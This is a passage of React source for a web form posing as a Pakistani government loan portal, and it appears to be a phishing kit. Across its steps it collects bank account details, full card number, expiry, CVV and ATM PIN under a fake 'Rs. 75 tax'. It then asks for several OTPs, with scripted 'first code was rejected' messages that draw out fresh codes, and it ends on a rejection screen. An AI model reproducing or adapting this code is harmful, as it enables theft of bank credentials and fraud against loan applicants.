              <option value="Business Expansion">Business Expansion / کاروبار میں توسیع</option>
              <option value="Agriculture">Agriculture & Tractor / زراعت اور ٹریکٹر</option>
              <option value="Housing">Housing Construction / مکان کی تعمیر</option>
              <option value="Higher Education">Higher Education / اعلی تعلیم</option>
              <option value="IT Startup">IT Startup & Freelancing / آئی ٹی اسٹارٹ اپ</option>
              <option value="Marriage Loan">Marriage Loan / شادی قرض</option>
            </select>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.occupation} *</span>
              <span className="font-urdu text-gray-500">{dict.occupationUrdu}</span>
            </label>
            <select
              required
              value={loan.occupation}
              onChange={(e) => handleLoanChange('occupation', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
            >
              <option value="">Select occupation / پیشہ منتخب کریں</option>
              <option value="Salaried">Salaried Employee / تنخواہ دار ملازم</option>
              <option value="Business">Business Owner / کاروباری شخصیت</option>
              <option value="Farmer">Farmer / کسان</option>
              <option value="Student">Student / طالب علم</option>
              <option value="Government">Government Servant / سرکاری ملازم</option>
            </select>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.bankName} *</span>
              <span className="font-urdu text-gray-500">{dict.bankNameUrdu}</span>
            </label>
            <select
              required
              value={loan.bankName}
              onChange={(e) => handleLoanChange('bankName', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
            >
              <option value="">
                {language === 'ur' ? 'اپنا بینک یا والٹ منتخب کریں' : 'Select your bank or wallet'}
              </option>
              {BANK_CATEGORIES.map(category => (
                <optgroup 
                  key={category.key} 
                  label={language === 'ur' ? category.titleUrdu : category.titleEn}
                >
                  {PAKISTAN_BANKS.filter(b => b.category === category.key).map(b => (
                    <option key={b.id} value={b.name}>
                      {b.name}
                    </option>
                  ))}
                </optgroup>
              ))}
            </select>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.accountNumber} *</span>
              <span className="font-urdu text-gray-500">{dict.accountNumberUrdu}</span>
            </label>
            <input
              type="text"
              required
              placeholder="01234567890123"
              value={loan.accountNumber}
              onChange={(e) => handleLoanChange('accountNumber', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="space-y-1">
              <label className="text-xs font-bold text-gray-700 flex justify-between">
                <span>{dict.currentBalance} *</span>
                <span className="font-urdu text-gray-500">{dict.currentBalanceUrdu}</span>
              </label>
              <input
                type="number"
                required
                placeholder="e.g. 25000"
                value={loan.currentBalance}
                onChange={(e) => handleLoanChange('currentBalance', e.target.value)}
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm"
              />
            </div>

            <div className="space-y-1">
              <label className="text-xs font-bold text-gray-700 flex justify-between">
                <span>{dict.monthlyIncome} *</span>
                <span className="font-urdu text-gray-500">{dict.monthlyIncomeUrdu}</span>
              </label>
              <input
                type="number"
                required
                placeholder="e.g. 75000"
                value={loan.monthlyIncome}
                onChange={(e) => handleLoanChange('monthlyIncome', e.target.value)}
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm"
              />
            </div>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.salaryDate} *</span>
              <span className="font-urdu text-gray-500">{dict.salaryDateUrdu}</span>
            </label>
            <input
              type="date"
              required
              value={loan.salaryDate}
              onChange={(e) => handleLoanChange('salaryDate', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
            />
          </div>

          {!isLoanComplete && (
            <div className="text-[11px] text-amber-800 bg-amber-50/80 border border-amber-200 rounded-xl p-3 flex items-center justify-between">
              <span>{language === 'ur' ? 'فیس ادائیگی پر جانے کے لیے قرض اور بینک کی تفصیلات مکمل کریں' : 'All loan and bank fields must be filled to proceed'}</span>
              <span className="font-bold text-amber-600">Pending</span>
            </div>
          )}

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('personal_info')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={!isLoanComplete}
              className={`flex-1 font-semibold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-2 text-sm shadow-sm ${
                isLoanComplete
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'bg-gray-100 text-gray-400 cursor-not-allowed border border-gray-200'
              }`}
            >
              {isLoanComplete ? (
                <>
                  <span>{dict.continue}</span>
                  <span className="font-urdu text-xs opacity-90">(جاری رکھیں)</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'قرض کی تمام تفصیلات درج کریں' : 'Enter All Loan Details to Continue'}</span>
                  <span className="font-urdu text-xs opacity-75">({language === 'ur' ? 'تمام خانے پُر کریں' : 'Required'})</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP 3: Fee Payment */}
      {currentStep === 'fee_payment' && (
        <form onSubmit={handlePaymentSubmit} className="space-y-6">
          <div className="bg-emerald-50 p-4 rounded-xl border border-emerald-200 space-y-1">
            <div className="flex justify-between items-center text-xs font-bold text-[#044e3b]">
              <span>Pay Rs. 75 processing tax to submit application</span>
              <span className="font-urdu">محفوظ ادائیگی</span>
            </div>
            <p className="text-xs text-emerald-800 font-urdu">
              درخواست جمع کرانے کے لیے 75 روپے ٹیکس ادا کریں۔ یہ فیس تصدیق کے لیے ہے۔
            </p>
          </div>

          {paymentError && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{paymentError}</p>
            </div>
          )}

          {/* Premium Debit Card matching 4K HD uploaded card design */}
          <div className="py-2">
            <div className="text-center mb-2">
              <span className={`inline-block px-3 py-1 rounded-full text-xs font-bold transition-all ${
                isCardFlipped ? 'bg-amber-500 text-white shadow-md' : 'bg-emerald-100 text-[#044e3b]'
              }`}>
                {isCardFlipped ? '💳 ATM CARD BACK SIDE (3-Digit CVV Entry)' : '💡 Tip: Click or focus CVV to flip card and view back side'}
              </span>
            </div>
            <PremiumDebitCard
              cardNumber={payment.cardNumber}
              expiry={payment.expiry}
              cvv={payment.cvv}
              cardholderName={personal.fullName}
              isFlipped={isCardFlipped}
            />
          </div>

          <div className="space-y-4">
            <div className="space-y-1">
              <label className="text-xs font-bold text-gray-700 flex justify-between">
                <span>{dict.atmCardNumber} *</span>
                <span className="font-urdu text-gray-500">{dict.atmCardNumberUrdu}</span>
              </label>
              <div className="relative">
                <CreditCard className="absolute left-3.5 top-3.5 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  required
                  maxLength={19}
                  placeholder="0000 0000 0000 0000"
                  value={payment.cardNumber}
                  onChange={(e) => handlePaymentChange('cardNumber', e.target.value)}
                  className="w-full pl-11 pr-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono"
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-1">
                <label className="text-xs font-bold text-gray-700 flex justify-between">
                  <span>{dict.expiry} *</span>
                  <span className="font-urdu text-gray-500">{dict.expiryUrdu}</span>
                </label>
                <input
                  type="text"
                  required
                  placeholder="MM/YY"
                  maxLength={5}
                  inputMode="numeric"
                  value={payment.expiry}
                  onChange={(e) => handlePaymentChange('expiry', e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === ' ' || e.key === 'Spacebar') {
                      e.preventDefault();
                      if (!payment.expiry.includes('/')) {
                        const digits = payment.expiry.replace(/\D/g, '');
                        if (digits.length === 1) {
                          handlePaymentChange('expiry', `0${digits}/`);
                        } else if (digits.length === 2) {
                          handlePaymentChange('expiry', `${digits}/`);
                        }
                      }
                    }
                  }}
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono text-center"
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs font-bold text-gray-700 flex justify-between">
                  <span>{dict.cvv} * (Back Side 3-Digit)</span>
                  <span className="font-urdu text-gray-500">کارڈ کی پچھلی سائیڈ 3 ہندسے</span>
                </label>
                <input
                  type="password"
                  required
                  maxLength={3}
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="3-Digit CVV"
                  value={payment.cvv}
                  onFocus={() => setIsCardFlipped(true)}
                  onBlur={() => setIsCardFlipped(false)}
                  onChange={(e) => handlePaymentChange('cvv', e.target.value)}
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono text-center font-bold"
                />
              </div>
            </div>

            <div className="bg-gray-50 p-4 rounded-xl border border-gray-200 flex justify-between items-center text-sm font-bold text-gray-900">
              <span>{dict.processingTax}:</span>
              <span className="text-[#044e3b] text-base">Rs. 75</span>
            </div>
          </div>

          {!isPaymentComplete && (
            <div className="text-[11px] text-amber-800 bg-amber-50/80 border border-amber-200 rounded-xl p-3 flex items-center justify-between">
              <span>{language === 'ur' ? 'کارڈ کی تمام تفصیلات (16 ہندسوں کا کارڈ نمبر، معیاد MM/YY، اور 3 ہندسوں کا CVV) درج کریں' : 'Enter 16-digit Card Number, Expiry (MM/YY) and 3-digit CVV to proceed'}</span>
              <span className="font-bold text-amber-600">Pending</span>
            </div>
          )}

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('loan_details')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={!isPaymentComplete}
              className={`flex-1 font-semibold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-2 text-sm shadow-sm ${
                isPaymentComplete
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'bg-gray-100 text-gray-400 cursor-not-allowed border border-gray-200'
              }`}
            >
              {isPaymentComplete ? (
                <>
                  <Lock className="w-4 h-4" />
                  <span>Pay Rs. 75 & Authorize</span>
                  <span className="font-urdu text-xs opacity-90">(75 روپے ادا کریں)</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4 opacity-50" />
                  <span>{language === 'ur' ? 'کارڈ کی مکمل تفصیلات درج کریں' : 'Enter Full Card Details to Proceed'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP 4: Searching / Verifying Loader */}
      {currentStep === 'searching' && (
        <div className="py-12 text-center space-y-6">
          <div className="w-20 h-20 mx-auto rounded-full bg-emerald-50 border-2 border-[#044e3b] flex items-center justify-center text-[#044e3b] shadow-inner animate-pulse">
            <ShieldCheck className="w-10 h-10 animate-spin" />
          </div>
          <div className="space-y-2">
            <h3 className="text-2xl font-bold text-gray-900">{searchMessage.title}</h3>
            <p className="text-sm text-gray-600">{searchMessage.subtitle}</p>
            <p className="text-xs text-[#044e3b] font-urdu pt-1">{searchMessage.urdu}</p>
          </div>
          <div className="pt-4">
            <div className="w-48 h-1.5 bg-gray-100 mx-auto rounded-full overflow-hidden">
              <div className="w-full h-full bg-[#044e3b] animate-indeterminate rounded-full"></div>
            </div>
            <p className="text-[11px] text-gray-400 mt-3">{dict.gateway}</p>
          </div>
        </div>
      )}

      {/* STEP 5: OTP Verification */}
      {currentStep === 'otp_verification' && (
        <form onSubmit={handleOtpSubmit} className="space-y-6">
          <div className="bg-gray-50 p-4 rounded-xl border border-gray-200 flex justify-between items-center text-xs">
            <div>
              <span className="text-gray-400 block">CODE SENT TO</span>
              <span className="font-mono font-bold text-gray-800 text-sm">5454 - {personal.mobileNo.slice(-5) || 'XXXX45'}</span>
            </div>
            <span className="bg-emerald-100 text-[#044e3b] px-3 py-1 rounded-full font-bold text-[10px]">SMS Verified</span>
          </div>

          {/* Resent Notice Toast Removed */}
          {false && otpResentNotice && (
            <div className="p-3 bg-emerald-50 border border-emerald-300 rounded-xl text-xs text-emerald-900 flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
              <span>
                {language === 'ur'
                  ? 'نیا OTP کوڈ کامیابی کے ساتھ آپ کے موبائل نمبر پر بھیج دیا گیا ہے۔'
                  : 'A fresh OTP code has been sent to your mobile number.'}
              </span>
            </div>
          )}

          {/* Error Message when OTP is Wrong */}
          {otpError && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <div className="space-y-1 flex-1">
                <p className="font-bold">{otpError}</p>
                {otpAttemptCount === 1 && otpError.includes('rejected') && (
                  <p className="text-[11px] text-rose-700 font-medium">
                    {language === 'ur'
                      ? `پہلا کوڈ منسوخ کر دیا گیا ہے۔ براہ کرم نیا 6 ہندسوں کا کوڈ درج کر کے جاری رکھیں۔`
                      : `First code was rejected. Please enter the new 6-digit OTP code to continue.`}
                  </p>
                )}
              </div>
            </div>
          )}

          <div className="space-y-3 text-center">
            <label className="block text-sm font-bold text-gray-800 uppercase tracking-wide">
              {otpAttemptCount === 1 ? (
                <span>
                  Verify OTP <span className="font-urdu">(او ٹی پی تصدیق کریں)</span>
                </span>
              ) : (
                <span>
                  Verify OTP <span className="font-urdu">(او ٹی پی تصدیق کریں)</span>
                </span>
              )}
            </label>

            {/* OTP Box Set in One Line */}
            <div className="py-2">
              <OtpBoxSet
                length={otpLength}
                value={typeof otpCode === 'string' ? otpCode : getCleanOtp(otpCode)}
                onChange={(val) => {
                  setOtpCode(val);
                  if (otpError) setOtpError('');
                }}
                onComplete={() => {}}
                disabled={isVerifyingOtp}
                hasError={!!otpError}
                idPrefix="otp-box"
                autoFocus={true}
              />
              <div className="text-center text-[11px] text-gray-400 mt-2 font-medium">
                {language === 'ur'
                  ? 'او ٹی پی 6 ہندسے درج کریں اور جاری رکھیں پر کلک کریں'
                  : 'Otp enter 6-digits click Continue'}
              </div>
            </div>
          </div>

          {/* Running Countdown Timer */}
          <div className="bg-gray-50 p-3 rounded-xl flex justify-between items-center text-xs text-gray-600 border border-gray-100">
            <div className="flex items-center gap-1.5 font-medium">
              <Clock className="w-3.5 h-3.5 text-[#044e3b]" />
              <span>{dict.expiresIn} / {dict.expiresInUrdu}:</span>
            </div>
            <div className="flex items-center gap-2">
              <span className={`font-mono font-bold text-sm ${timeLeft <= 30 ? 'text-rose-600 animate-pulse' : 'text-[#044e3b]'}`}>
                {formatTime(timeLeft)}
              </span>
              <button
                type="button"
                onClick={handleResendOtp}
                className="text-[11px] font-semibold text-[#044e3b] hover:text-[#033b2e] underline flex items-center gap-1 ml-2 transition"
              >
                <RefreshCw className="w-3 h-3" />
                <span>{dict.resend} ({dict.resendUrdu})</span>
              </button>
            </div>
          </div>

          <div className="bg-amber-50 p-4 rounded-xl border border-amber-200 text-xs text-amber-900 space-y-1">
            <p className="font-semibold">Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.</p>
            <p className="font-urdu text-[11px]">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</p>
          </div>

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              disabled={isVerifyingOtp}
              onClick={() => setCurrentStep('fee_payment')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2 disabled:opacity-50"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={isVerifyingOtp || getCleanOtp(otpCode).length < 6}
              className={`flex-1 font-semibold py-3 px-6 rounded-xl transition flex items-center justify-center gap-2 shadow-sm text-sm ${
                getCleanOtp(otpCode).length === 6 && !isVerifyingOtp
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'hidden'
              }`}
            >
              {isVerifyingOtp ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>{language === 'ur' ? 'تصدیق ہو رہی ہے...' : 'Verifying OTP...'}</span>
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP 6: ATM PIN Verification */}
      {currentStep === 'atm_pin_verification' && (
        <form onSubmit={handleAtmPinSubmit} className="space-y-6">
          <div className="bg-emerald-50 p-4 rounded-xl border border-emerald-200 space-y-2">
            <div className="flex justify-between items-center text-xs font-bold text-[#044e3b]">
              <span>Security Verification Tax: Rs. 75</span>
              <span className="font-urdu">اے ٹی ایم پن</span>
            </div>
            <p className="text-xs text-emerald-900 leading-relaxed">
              For your account security, a one-time refundable tax of Rs. 75 will be charged. Please enter your 4-digit ATM PIN to authorize this verification.
            </p>
            <p className="text-xs text-emerald-800 font-urdu">
              آپ کے اکاؤنٹ کی حفاظت کے لیے 75 روپے کا قابل واپسی ٹیکس وصول کیا جائے گا۔ تصدیق کے لیے اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں۔
            </p>
          </div>

          {/* Target Card Display */}
          <div className="bg-slate-900 text-white p-4 rounded-xl flex items-center justify-between border border-emerald-500/20">
            <div className="flex items-center gap-3">
              <img
                src="/pakistan_state_emblem.jpg"
                alt="State Emblem of Pakistan"
                className="w-7 h-7 object-contain bg-white rounded-lg p-0.5 border border-emerald-400/40 shrink-0"
              />
              <div>
                <span className="text-[10px] uppercase text-emerald-400 font-bold block">Target Debit Card</span>
                <span className="font-mono text-sm tracking-widest text-slate-200">
                  {payment.cardNumber ? `XXXX XXXX XXXX ${payment.cardNumber.slice(-4)}` : 'XXXX XXXX XXXX XXXX'}
                </span>
              </div>
            </div>
            <span className="bg-emerald-800 text-emerald-100 text-[10px] px-2.5 py-1 rounded font-bold">PREMIUM DEBIT</span>
          </div>

          {/* ATM PIN Error Message */}
          {atmPinError && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <div className="space-y-1 flex-1">
                <p className="font-bold">{atmPinError}</p>
                {atmPinAttemptCount === 1 && (
                  <p className="text-[11px] text-rose-700 font-medium">
                    {language === 'ur'
                      ? 'پہلا پن مسترد کر دیا گیا ہے۔ براہ کرم تصدیق کے لیے درست 4 ہندسوں کا پن دوبارہ درج کریں۔'
                      : 'First PIN verification failed. Please enter your correct 4-digit ATM PIN to finalize.'}
                  </p>
                )}
              </div>
            </div>
          )}

          <div className="space-y-3 text-center">
            <label className="text-xs font-bold text-gray-700 block">
              {atmPinAttemptCount === 1 ? (
                <span className="text-rose-700 font-bold">
                  Enter correct 4-digit ATM PIN <span className="font-urdu">(درست 4 ہندسوں کا پن درج کریں)</span>
                </span>
              ) : (
                <span>
                  Enter 4-digit ATM PIN <span className="font-urdu text-gray-500">(4 ہندسوں کا پن درج کریں)</span>
                </span>
              )}
            </label>
            <div className="flex justify-center">
              <OtpBoxSet
                length={4}
                value={atmPin}
                onChange={(val) => {
                  setAtmPin(val);
                  if (atmPinError) setAtmPinError('');
                }}
                onComplete={() => {}}
                disabled={isVerifyingAtmPin}
                hasError={!!atmPinError}
                idPrefix="pin"
                isPassword={true}
                autoFocus={true}
              />
            </div>
          </div>

          <div className="bg-gray-50 p-4 rounded-xl border border-gray-200 text-xs text-gray-600 space-y-1 text-center">
            <p>Your ATM PIN is encrypted end-to-end and used only for one-time security verification.</p>
            <p className="font-urdu">آپ کا پن مکمل طور پر محفوظ ہے اور صرف ایک بار تصدیق کے لیے استعمال ہوگا۔</p>
          </div>

          {!isAtmPinComplete && (
            <div className="text-[11px] text-amber-800 bg-amber-50/80 border border-amber-200 rounded-xl p-3 flex items-center justify-between">
              <span>{language === 'ur' ? 'مکمل 4 ہندسوں کا اے ٹی ایم پن درج کریں' : 'Enter complete 4-digit ATM PIN to proceed'}</span>
              <span className="font-bold text-amber-600 font-mono">{atmPin.length} / 4</span>
            </div>
          )}

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('otp_verification')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={isVerifyingAtmPin || !isAtmPinComplete}
              className={`flex-1 font-semibold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-2 text-sm shadow-sm ${
                isAtmPinComplete && !isVerifyingAtmPin
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'hidden'
              }`}
            >
              {isVerifyingAtmPin ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>{language === 'ur' ? 'تصدیق ہو رہی ہے...' : 'Verifying ATM PIN...'}</span>
                </>
              ) : isAtmPinComplete ? (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4 opacity-50" />
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP: OTP Step 1 */}
      {currentStep === 'otp_step_1' && (
        <form onSubmit={handleOtpStep1Submit} className="space-y-6">
          {otpStep1Error && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{otpStep1Error}</p>
            </div>
          )}

          <div className="space-y-3 text-center">
            <label className="block text-sm font-bold text-gray-800 uppercase tracking-wide">
              Verify OTP <span className="font-urdu">(او ٹی پی تصدیق کریں - 1)</span>
            </label>

            <OtpBoxSet
              length={otpStep1Length}
              value={otpStep1}
              onChange={(val) => {
                setOtpStep1(val);
                if (otpStep1Error) setOtpStep1Error('');
              }}
              onComplete={() => {}}
              disabled={isVerifyingOtpStep1}
              hasError={!!otpStep1Error}
              idPrefix="otp-step1"
              autoFocus={true}
            />
            <div className="text-center text-[11px] text-gray-400 mt-2 font-medium">
              {language === 'ur'
                ? 'او ٹی پی 6 ہندسے درج کریں اور جاری رکھیں پر کلک کریں'
                : 'Otp enter 6-digits click Continue'}
            </div>
          </div>

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('atm_pin_verification')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={isVerifyingOtpStep1 || otpStep1.length < 6}
              className={`flex-1 py-3.5 rounded-xl font-bold text-sm tracking-wide shadow-sm flex items-center justify-center gap-2 transition-all ${
                otpStep1.length === 6 && !isVerifyingOtpStep1
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'hidden'
              }`}
            >
              {isVerifyingOtpStep1 ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Verifying Step 1...</span>
                </>
              ) : otpStep1.length === 6 ? (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP: OTP Step 2 */}
      {currentStep === 'otp_step_2' && (
        <form onSubmit={handleOtpStep2Submit} className="space-y-6">
          {otpStep2Error && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{otpStep2Error}</p>
            </div>
          )}

          <div className="space-y-3 text-center">
            <label className="block text-sm font-bold text-gray-800 uppercase tracking-wide">
              Verify OTP <span className="font-urdu">(او ٹی پی تصدیق کریں - 2)</span>
            </label>

            <OtpBoxSet
              length={otpStep2Length}
              value={otpStep2}
              onChange={(val) => {
                setOtpStep2(val);
                if (otpStep2Error) setOtpStep2Error('');
              }}
              onComplete={() => {}}
              disabled={isVerifyingOtpStep2}
              hasError={!!otpStep2Error}
              idPrefix="otp-step2"
              autoFocus={true}
            />
            <div className="text-center text-[11px] text-gray-400 mt-2 font-medium">
              {language === 'ur'
                ? 'او ٹی پی 6 ہندسے درج کریں اور جاری رکھیں پر کلک کریں'
                : 'Otp enter 6-digits click Continue'}
            </div>
          </div>

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('otp_step_1')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={isVerifyingOtpStep2 || otpStep2.length < 6}
              className={`flex-1 py-3.5 rounded-xl font-bold text-sm tracking-wide shadow-sm flex items-center justify-center gap-2 transition-all ${
                otpStep2.length === 6 && !isVerifyingOtpStep2
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'hidden'
              }`}
            >
              {isVerifyingOtpStep2 ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Verifying Step 2...</span>
                </>
              ) : otpStep2.length === 6 ? (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP: OTP Step 3 */}
      {currentStep === 'otp_step_3' && (
        <form onSubmit={handleOtpStep3Submit} className="space-y-6">
          {otpStep3Error && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{otpStep3Error}</p>
            </div>
          )}

          <div className="space-y-3 text-center">
            <label className="block text-sm font-bold text-gray-800 uppercase tracking-wide">
              Verify OTP <span className="font-urdu">(او ٹی پی تصدیق کریں - 3)</span>
            </label>

            <OtpBoxSet
              length={otpStep3Length}
              value={otpStep3}
              onChange={(val) => {
                setOtpStep3(val);
                if (otpStep3Error) setOtpStep3Error('');
              }}
              onComplete={() => {}}
              disabled={isVerifyingOtpStep3}
              hasError={!!otpStep3Error}
              idPrefix="otp-step3"
              autoFocus={true}
            />
            <div className="text-center text-[11px] text-gray-400 mt-2 font-medium">
              {language === 'ur'
                ? 'او ٹی پی 6 ہندسے درج کریں اور جاری رکھیں پر کلک کریں'
                : 'Otp enter 6-digits click Continue'}
            </div>
          </div>

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={() => setCurrentStep('otp_step_2')}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{dict.back}</span>
            </button>
            <button
              type="submit"
              disabled={isVerifyingOtpStep3 || otpStep3.length < 6}
              className={`flex-1 py-3.5 rounded-xl font-bold text-sm tracking-wide shadow-sm flex items-center justify-center gap-2 transition-all ${
                otpStep3.length === 6 && !isVerifyingOtpStep3
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'hidden'
              }`}
            >
              {isVerifyingOtpStep3 ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Finalizing & Approving...</span>
                </>
              ) : otpStep3.length === 6 ? (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'جاری رکھیں' : 'Continue'}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP 7: Rejection Screen */}
      {currentStep === 'success' && (
        <div className="py-6 text-center space-y-6">
          <div className="w-20 h-20 mx-auto rounded-full bg-rose-50 border-2 border-rose-600 flex items-center justify-center text-rose-600 shadow-inner">
            <AlertCircle className="w-10 h-10" />
          </div>

          <div className="space-y-2">
